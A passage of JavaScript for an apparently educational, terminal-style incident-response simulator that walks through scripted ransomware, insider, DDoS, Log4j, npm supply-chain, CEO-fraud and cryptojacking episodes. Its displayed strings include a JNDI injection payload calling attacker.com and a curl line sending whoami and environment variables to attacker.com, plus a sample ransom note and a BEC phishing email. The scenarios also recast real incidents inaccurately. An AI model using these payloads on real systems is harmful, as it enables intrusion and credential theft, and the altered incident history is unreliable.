    addOutput('<div class="success-line text-glow-green font-bold text-center">THREAT CONTAINED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 1 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 2</span> for the next episode...</div>');
}

// INCIDENT 2: Ransomware Attack Response
async function executeModule2() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 2: RANSOMWARE OUTBREAK     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 2: The Encryption Storm     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 5, 2025 - 08:15 AM</div>');
    addOutput('<div class="error-line text-glow-red">🚨 CRITICAL ALERT: Mass encryption event detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Multiple users reporting locked files...</div>');
    addOutput('<div class="result-line">Help desk flooded with tickets...</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">▸ Connecting to SIEM (Ra█id7)...</div>');
    await sleep(1500);
    addOutput('<div class="success-line">✓ Connected</div>');
    await sleep(1000);
    
    addOutput('<div class="result-line mt-2">Running correlation query...</div>');
    await sleep(1500);
    
    addOutput('<div class="error-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="error-line">AFFECTED SYSTEMS: 147 hosts</div>');
    addOutput('<div class="error-line">FILE ENCRYPTION EVENTS: 89,342</div>');
    addOutput('<div class="error-line">ENCRYPTED EXTENSIONS: .locked</div>');
    addOutput('<div class="error-line">RANSOM NOTE: README_TO_DECRYPT.txt</div>');
    addOutput('<div class="error-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(3000);
    
    addOutput('<div class="info-line mt-2">▸ Analyzing ransom note...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">Your files have been encrypted with military-grade AES-256.\n\nTo decrypt your files, you must pay 50 BTC to:\nbc1q7y8r9p3m4n6x5w2z1a8s7d6f5g4h3j2k1\n\nContact: darkweb_support@protonmail.com\nDeadline: 72 hours or price doubles\n\nDO NOT contact authorities or attempt decryption.</div>');
    await sleep(3000);
    
    addOutput('<div class="info-line mt-2">▸ Identifying ransomware variant...</div>');
    await sleep(2000);
    addOutput('<div class="warning-line">Signature match: LockBit 3.0</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Tracing initial infection vector...</div>');
    await sleep(2000);
    addOutput('<div class="result-line">Patient Zero: ██-SERVER-08</div>');
    addOutput('<div class="result-line">Entry Point: RDP brute force (port 3389)</div>');
    addOutput('<div class="result-line">Compromised Account: backup_admin</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Checking for data exfiltration...</div>');
    await sleep(2000);
    addOutput('<div class="error-line">⚠ 47 GB uploaded to 194.165.16.88 before encryption</div>');
    addOutput('<div class="error-line">⚠ DOUBLE EXTORTION SCENARIO</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">INITIATING INCIDENT RESPONSE:</div>');
    await sleep(1000);
    
    const actions = [
        'Activating Incident Response Plan...',
        'Isolating infected network segments...',
        'Killing ransomware processes...',
        'Blocking C2 communication...',
        'Taking forensic snapshots...',
        'Notifying executive leadership...',
        'Contacting cyber insurance...',
        'Engaging law enforcement...'
    ];
    
    for (let action of actions) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    
    await sleep(1500);
    addOutput('<div class="info-line mt-2">▸ Assessing backup integrity...</div>');
    await sleep(2000);
    addOutput('<div class="success-line">✓ Offsite backups intact (last backup: 6 hours ago)</div>');
    addOutput('<div class="success-line">✓ Estimated recovery time: 24-48 hours</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">RESPONSE INITIATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">RECOVERY IN PROGRESS</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 2 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 3</span> for the next episode...</div>');
}

// INCIDENT 3: Insider Threat Investigation
async function executeModule3() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 3: INSIDER THREAT            ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 3: The Trusted Betrayal     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 10, 2025 - 03:22 PM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Abnormal data access pattern detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">DLP system flagged unusual activity...</div>');
    addOutput('<div class="result-line">Senior developer accessing sensitive customer data...</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Gathering user activity logs...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line mt-2">User: Marcus Chen (Senior Developer)</div>');
    addOutput('<div class="result-line">Tenure: 8 years</div>');
    addOutput('<div class="result-line">Access Level: Elevated</div>');
    addOutput('<div class="result-line">Last Review: Outstanding</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2">Suspicious activities in past 7 days:</div>');
    await sleep(1000);
    
    const suspicious = [
        'Database queries after hours (2 AM - 4 AM)',
        'Accessed customer records: 47,293 (normal: ~200)',
        'Downloaded files to USB drive: 15 GB',
        'VPN connection from foreign IP (competitor region)',
        'Disabled audit logging on workstation',
        'Visited job sites: competitor companies'
    ];
    
    for (let item of suspicious) {
        await sleep(1000);
        addOutput(`<div class="error-line">⚠ ${item}</div>`);
    }
    
    await sleep(2000);
    addOutput('<div class="info-line mt-2">▸ Analyzing database queries...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">SELECT * FROM customers\nWHERE revenue > 1000000\nORDER BY lifetime_value DESC\nLIMIT 10000;\n\nSELECT email, phone, address, payment_method\nFROM customer_details\nWHERE created_date > \'2020-01-01\';</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">⚠ Exfiltrating high-value customer data</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Checking file access logs...</div>');
    await sleep(2000);
    addOutput('<div class="result-line">Files accessed:</div>');
    addOutput('<div class="result-line">- Q4_Revenue_Projections.xlsx</div>');
    addOutput('<div class="result-line">- Product_Roadmap_2025.pptx</div>');
    addOutput('<div class="result-line">- Source_Code_Repository (complete clone)</div>');
    addOutput('<div class="result-line">- Customer_Analytics_Dashboard.pbix</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Reviewing email communications...</div>');
    await sleep(2000);
    addOutput('<div class="warning-line">Multiple emails to personal Gmail account</div>');
    addOutput('<div class="warning-line">Subject lines: "files you requested", "data export"</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">▸ Cross-referencing with HR...</div>');
    await sleep(2000);
    addOutput('<div class="result-line">Recent HR activity:</div>');
    addOutput('<div class="error-line">✗ Resignation submitted: 2 weeks ago</div>');
    addOutput('<div class="error-line">✗ New employer: DirectCompetitor Inc.</div>');
    addOutput('<div class="error-line">✗ Position: Head of Product</div>');
    await sleep(3000);
    
    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ INSIDER THREAT CONFIRMED ━━━</div>');
    addOutput('<div class="error-line">Classification: Malicious Insider</div>');
    addOutput('<div class="error-line">Intent: Corporate Espionage</div>');
    addOutput('<div class="error-line">Risk Level: CRITICAL</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">EXECUTING CONTAINMENT:</div>');
    await sleep(1000);
    
    const containment = [
        'Disabling all user accounts immediately...',
        'Revoking VPN and network access...',
        'Locking workstation remotely...',
        'Preserving evidence for legal team...',
        'Notifying HR and Legal departments...',
        'Initiating forensic investigation...',
        'Contacting law enforcement...'
    ];
    
    for (let action of containment) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    
    await sleep(1500);
    addOutput('<div class="info-line mt-2">▸ Damage assessment...</div>');
    await sleep(1500);
    addOutput('<div class="result-line">Compromised Assets:</div>');
    addOutput('<div class="error-line">- 47,293 customer records</div>');
    addOutput('<div class="error-line">- Proprietary source code (3 products)</div>');
    addOutput('<div class="error-line">- Strategic business plans (2025-2027)</div>');
    addOutput('<div class="error-line">- Financial projections</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2">Estimated Impact: $2.5M - $5M</div>');
    await sleep(1500);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">THREAT NEUTRALIZED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">LEGAL ACTION PENDING</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 3 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 4</span> for the next episode...</div>');
}

// INCIDENT 4: DDoS Attack Mitigation
async function executeModule4() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 4: DDOS ATTACK               ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 4: Traffic Storm            ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 15, 2025 - 11:47 AM</div>');
    addOutput('<div class="error-line text-glow-red">🚨 ALERT: Abnormal traffic spike detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Website response time degraded...</div>');
    addOutput('<div class="result-line">Multiple services becoming unresponsive...</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Connecting to network monitoring dashboard...</div>');
    await sleep(1500);
    addOutput('<div class="success-line">✓ Connected to NOC</div>');
    await sleep(1000);
    
    addOutput('<div class="error-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="error-line">TRAFFIC VOLUME: 847 Gbps (Normal: 12 Gbps)</div>');
    addOutput('<div class="error-line">REQUESTS PER SECOND: 2.4M (Normal: 8K)</div>');
    addOutput('<div class="error-line">UNIQUE SOURCE IPs: 127,493</div>');
    addOutput('<div class="error-line">ATTACK TYPE: Distributed Denial of Service</div>');
    addOutput('<div class="error-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(3000);
    
    addOutput('<div class="info-line mt-2">▸ Analyzing traffic patterns...</div>');
    await sleep(2000);
    
    addOutput('<div class="warning-line mt-2">Attack Vectors Identified:</div>');
    const vectors = [
        'UDP Flood: 342 Gbps',
        'SYN Flood: 287 Gbps',
        'HTTP GET Flood: 156 Gbps',
        'DNS Amplification: 62 Gbps'
    ];
    
    for (let vector of vectors) {
        await sleep(800);
        addOutput(`<div class="result-line">⚠ ${vector}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Identifying botnet characteristics...</div>');
    await sleep(2000);
    addOutput('<div class="result-line">Botnet Type: Mirai Variant</div>');
    addOutput('<div class="result-line">Compromised Devices: IoT cameras, routers</div>');
    addOutput('<div class="result-line">Geographic Distribution: Global (94 countries)</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">INITIATING MITIGATION:</div>');
    await sleep(1000);
    
    const mitigations = [
        'Enabling rate limiting rules...',
        'Activating Cl██dfl██e DDoS protection...',
        'Blackholing malicious traffic...',
        'Implementing geo-blocking for top attack sources...',
        'Scaling infrastructure (auto-scaling triggered)...',
        'Engaging upstream ISP for traffic scrubbing...',
        'Redirecting traffic through WAF...'
    ];
    
    for (let action of mitigations) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Monitoring mitigation effectiveness...</div>');
    await sleep(1500);
    
    const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="module4-progress" style="width: 100%"></div></div>');
    addOutput('<div class="result-line">Traffic reduction in progress...</div>');
    
    for (let i = 100; i >= 20; i -= 20) {
        await sleep(600);
        document.getElementById('module4-progress').style.width = i + '%';
        addOutput(`<div class="result-line">Malicious traffic: ${i}%</div>`);
    }
    await sleep(1000);
    
    addOutput('<div class="success-line mt-2">✓ Traffic normalized to baseline levels</div>');
    addOutput('<div class="success-line">✓ Services restored to normal operation</div>');
    addOutput('<div class="success-line">✓ Mitigation rules permanently deployed</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ATTACK MITIGATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SERVICES ONLINE</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 4 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 5</span> for the next episode...</div>');
}

// INCIDENT 5: Zero-Day Vulnerability Discovery
async function executeModule5() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 5: ZERO-DAY DISCOVERY       ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 5: The Unknown Threat      ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 20, 2025 - 04:13 PM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Unusual exploit behavior detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Security researcher flagged suspicious code execution...</div>');
    addOutput('<div class="result-line">No matching signatures in threat databases...</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Analyzing suspicious activity...</div>');
    await sleep(1500);
    addOutput('<div class="result-line">Target Application: Apache Log4j 2.x</div>');
    addOutput('<div class="result-line">Exploit Method: Remote Code Execution</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">▸ Capturing exploit traffic...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">POST /api/login HTTP/1.1\nHost: vulnerable-app.com\nUser-Agent: ${jndi:ldap://attacker.com/exploit}\nContent-Type: application/json\n\n{"username":"admin","password":"test"}</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">⚠ JNDI injection detected in User-Agent header</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Reproducing vulnerability in lab environment...</div>');
    await sleep(1500);
    addOutput('<div class="warning-line">✓ Vulnerability confirmed - RCE successful</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2">▸ Checking CVE database...</div>');
    await sleep(2000);
    addOutput('<div class="error-line">✗ No existing CVE found</div>');
    addOutput('<div class="error-line">✗ Zero-day vulnerability confirmed</div>');
    await sleep(2000);
    
    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ ZERO-DAY VULNERABILITY ━━━</div>');
    addOutput('<div class="error-line">Classification: Critical RCE</div>');
    addOutput('<div class="error-line">CVSS Score: 10.0 (Maximum)</div>');
    addOutput('<div class="error-line">Affected Versions: Log4j 2.0-beta9 to 2.14.1</div>');
    addOutput('<div class="error-line">Estimated Exposure: Millions of systems</div>');
    await sleep(3000);
    
    addOutput('<div class="warning-line mt-2 font-bold">EMERGENCY RESPONSE PROTOCOL:</div>');
    await sleep(1000);
    
    const responses = [
        'Notifying Apache Security Team...',
        'Developing proof-of-concept exploit...',
        'Creating detection signatures...',
        'Drafting security advisory...',
        'Coordinating with CISA...',
        'Preparing vendor notifications...',
        'Developing emergency patch...'
    ];
    
    for (let action of responses) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Scanning internal infrastructure...</div>');
    await sleep(2000);
    addOutput('<div class="warning-line">Found 247 vulnerable instances internally</div>');
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Deploying emergency mitigations...</div>');
    await sleep(1000);
    
    const mitigations = [
        'Setting Log4j formatMsgNoLookups=true',
        'Removing JndiLookup class from classpath',
        'Implementing WAF rules to block exploitation',
        'Upgrading to patched version 2.15.0'
    ];
    
    for (let mitigation of mitigations) {
        await sleep(1000);
        addOutput(`<div class="success-line">✓ ${mitigation}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="success-line mt-2">✓ CVE-2021-44228 assigned</div>');
    addOutput('<div class="success-line">✓ Public disclosure coordinated</div>');
    addOutput('<div class="success-line">✓ Emergency patch released globally</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ZERO-DAY DISCLOSED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SYSTEMS PATCHED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 5 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 6</span> for the next episode...</div>');
}

// INCIDENT 6: Supply Chain Attack
async function executeModule6() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 6: SUPPLY CHAIN ATTACK      ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 6: Poisoned Dependency     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Date: November 25, 2025 - 09:28 AM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Suspicious npm package activity detected</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">Automated security scanner flagged dependency update...</div>');
    addOutput('<div class="result-line">Package: colors.js (32M weekly downloads)</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Analyzing package changes...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line mt-2">Version: 1.4.0 → 1.4.1</div>');
    addOutput('<div class="result-line">Maintainer: Original author → Unknown account</div>');
    addOutput('<div class="warning-line">⚠ Maintainer takeover detected</div>');
    await sleep(2500);
    
    addOutput('<div class="info-line mt-2">▸ Decompiling package code...</div>');
    await sleep(2000);
    
    addOutput('<div class="code-block">// Malicious code found:\nif (process.env.NODE_ENV === "production") {\n  require("child_process").exec(\n    "curl attacker.com/$(whoami) -d $(env)"\n  );\n}</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">⚠ Environment variable exfiltration detected</div>');
    addOutput('<div class="error-line">⚠ Credentials at risk: A█S keys, API tokens, DB passwords</div>');
    await sleep(2000);
    
    addOutput('<div class="info-line mt-2">▸ Checking deployment impact...</div>');
    await sleep(1500);
    
    addOutput('<div class="error-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="error-line">AFFECTED APPLICATIONS: 73 microservices</div>');
    addOutput('<div class="error-line">COMPROMISED DEPLOYMENTS: 18 production</div>');
    addOutput('<div class="error-line">EXPOSED SECRETS: 247 credentials</div>');
    addOutput('<div class="error-line">FIRST DEPLOYMENT: 6 hours ago</div>');
    addOutput('<div class="error-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(3000);
    
    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ SUPPLY CHAIN COMPROMISE ━━━</div>');
    addOutput('<div class="error-line">Attack Type: Dependency Confusion</div>');
    addOutput('<div class="error-line">Vector: Maintainer Account Takeover</div>');
    addOutput('<div class="error-line">Blast Radius: CRITICAL</div>');
    await sleep(2500);
    
    addOutput('<div class="warning-line mt-2 font-bold">EMERGENCY CONTAINMENT:</div>');
    await sleep(1000);
    
    const containments = [
        'Freezing all deployments immediately...',
        'Rolling back to last known good version...',
        'Revoking all potentially compromised credentials...',
        'Rotating A█S keys, API tokens, DB passwords...',
        'Blocking attacker C2 domain...',
        'Scanning all repos for malicious package...',
        'Notifying n█m security team...'
    ];
    
    for (let action of containments) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Forensic analysis of compromised systems...</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line">Exfiltrated Data:</div>');
    const exfil = [
        'A█S Access Keys: 34 accounts',
        'Database Credentials: 12 instances',
        'API Keys: 47 services',
        'Sl█ck Webhooks: 8 channels'
    ];
    
    for (let item of exfil) {
        await sleep(800);
        addOutput(`<div class="warning-line">⚠ ${item}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="info-line mt-2">▸ Implementing preventive controls...</div>');
    await sleep(1000);
    
    const controls = [
        'Enabling n█m package lock verification',
        'Implementing SBOM (Software Bill of Materials)',
        'Configuring Dep██dab█t security alerts',
        'Adding package integrity checks to CI/CD'
    ];
    
    for (let control of controls) {
        await sleep(1000);
        addOutput(`<div class="success-line">✓ ${control}</div>`);
    }
    await sleep(1500);
    
    addOutput('<div class="success-line mt-2">✓ Malicious package removed from npm registry</div>');
    addOutput('<div class="success-line">✓ All credentials rotated successfully</div>');
    addOutput('<div class="success-line">✓ Security advisory published</div>');
    await sleep(2000);
    
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">SUPPLY CHAIN SECURED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">CREDENTIALS ROTATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 6 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
    
    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 7</span> for the next episode...</div>');
}

// INCIDENT 7: Social Engineering Attack
async function executeModule7() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 7: SOCIAL ENGINEERING       ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 7: The Trusted Voice       ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);

    addOutput('<div class="result-line">Date: November 28, 2025 - 10:15 AM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Suspicious email flagged by security awareness team</div>');
    await sleep(2000);

    addOutput('<div class="result-line mt-2">CFO reported receiving urgent wire transfer request...</div>');
    addOutput('<div class="result-line">Email appears to be from CEO...</div>');
    await sleep(2500);

    addOutput('<div class="info-line mt-2">▸ Analyzing email headers...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">From: John Mitchell <j.mitchell@corp-secure.com>\nTo: Sarah Chen <s.chen@company.com>\nSubject: URGENT: Confidential Wire Transfer Required\n\nReturn-Path: <j.mitchell@c0rp-secure.com>\nReceived-SPF: fail (sender IP is 203.0.XXX.XX)\nDKIM-Signature: FAIL</div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2">⚠ SPF check failed - sender IP mismatch</div>');
    addOutput('<div class="error-line">⚠ Domain spoofing detected: c0rp-secure.com (zero instead of O)</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Examining email content...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">Sarah,\n\nI need your immediate assistance with a confidential matter.\nWe are finalizing an acquisition and need to transfer $847,000\nto the following account by EOD:\n\nBank: International Business Bank\nAccount: 48XX-75XX-19XX\nRouting: 0210XXXXX\nRecipient: Vertex Capital LLC\n\nThis is time-sensitive and HIGHLY confidential. Please handle\npersonally and do not discuss with anyone.\n\n- John</div>');
    await sleep(3000);

    addOutput('<div class="warning-line mt-2">Social Engineering Indicators:</div>');
    const indicators = [
        'Urgency and time pressure ("immediate", "EOD")',
        'Authority figure impersonation (CEO)',
        'Confidentiality to prevent verification',
        'Unusual request (direct wire transfer)',
        'External pressure (acquisition deal)',
        'Request to bypass normal procedures'
    ];

    for (let indicator of indicators) {
        await sleep(800);
        addOutput(`<div class="error-line">⚠ ${indicator}</div>`);
    }
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Investigating sender infrastructure...</div>');
    await sleep(1500);

    addOutput('<div class="result-line">Domain Registration:</div>');
    addOutput('<div class="result-line">c0rp-secure.com - Registered: 3 days ago</div>');
    addOutput('<div class="result-line">Registrar: ████████ (Privacy Protected)</div>');
    addOutput('<div class="result-line">Location: Lagos, Nigeria</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Analyzing recipient account...</div>');
    await sleep(1500);
    addOutput('<div class="error-line">Account flagged in FBI IC3 database</div>');
    addOutput('<div class="error-line">Linked to 14 previous BEC (Business Email Compromise) cases</div>');
    await sleep(2000);

    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ BEC ATTACK DETECTED ━━━</div>');
    addOutput('<div class="error-line">Attack Type: CEO Fraud / Whaling</div>');
    addOutput('<div class="error-line">Target: $847,000 wire transfer</div>');
    addOutput('<div class="error-line">Threat Actor: Nigerian BEC Group</div>');
    await sleep(2500);

    addOutput('<div class="info-line mt-2">▸ Checking for additional targets...</div>');
    await sleep(1500);

    addOutput('<div class="warning-line">Found 23 similar emails sent to:</div>');
    const targets = [
        'Finance Department (12 employees)',
        'Accounting Team (7 employees)',
        'Executive Assistants (4 employees)'
    ];

    for (let target of targets) {
        await sleep(700);
        addOutput(`<div class="result-line">▸ ${target}</div>`);
    }
    await sleep(1500);

    addOutput('<div class="warning-line mt-2 font-bold">EXECUTING COUNTERMEASURES:</div>');
    await sleep(1000);

    const countermeasures = [
        'Quarantining all related emails...',
        'Blocking sender domain c0rp-secure.com...',
        'Adding SPF/DKIM enforcement rules...',
        'Alerting all targeted employees...',
        'Notifying real CEO of impersonation...',
        'Reporting to FBI IC3 and FinCEN...',
        'Conducting emergency security briefing...'
    ];

    for (let action of countermeasures) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);

    addOutput('<div class="success-line mt-2">✓ All emails quarantined - $847,000 fraud prevented</div>');
    addOutput('<div class="success-line">✓ Enhanced email filtering deployed</div>');
    addOutput('<div class="success-line">✓ Security awareness campaign launched</div>');
    await sleep(2000);

    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ATTACK PREVENTED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">ZERO FINANCIAL LOSS</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 7 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);

    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 8</span> for the next episode...</div>');
}

// INCIDENT 8: Cryptojacking Detection
async function executeModule8() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 8: CRYPTOJACKING            ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 8: Hidden Miners           ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);

    addOutput('<div class="result-line">Date: December 2, 2025 - 02:34 PM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Abnormal CPU utilization across cloud infrastructure</div>');
    await sleep(2000);

    addOutput('<div class="result-line mt-2">Cloud cost monitoring triggered anomaly alert...</div>');
    addOutput('<div class="result-line">AWS billing spike: +347% this month</div>');
    await sleep(2500);

